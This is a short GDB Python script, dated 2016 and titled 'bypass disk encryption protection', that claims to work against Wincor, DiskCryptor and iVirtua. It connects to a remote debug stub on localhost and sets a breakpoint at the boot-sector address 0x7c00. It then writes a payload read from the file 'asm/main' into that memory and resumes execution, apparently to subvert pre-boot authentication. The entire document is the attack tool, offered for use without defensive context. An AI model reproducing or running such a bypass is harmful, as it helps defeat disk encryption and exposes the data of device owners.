# bypass disk encryption protection
# 15/06/2016 
# -snp
# works with Wincor, Diskcryptor and iVirtua (from version 1 to 10)
# 
PAYLOAD='asm/main'
ADDRESS=0x00007c00
BREAK="*0x00007c00"
BPT_HIT=2
class DebugPrintingBreakpoint(gdb.Breakpoint):
    count=0
    f=open(PAYLOAD,'rb')
    payload=f.read()
    f.close()
    def stop(self):
        if self.count < BPT_HIT:
            self.count = self.count+1
            return False
        for i in range(len(self.payload)):
            gdb.execute("set {char}0x%x = 0x%x" % (ADDRESS+i, ord(self.payload[i])))
        count=0
        print ("executing main stub...")
        return False
gdb.execute("tar remote localhost:1234")
DebugPrintingBreakpoint(BREAK)
gdb.execute("continue")
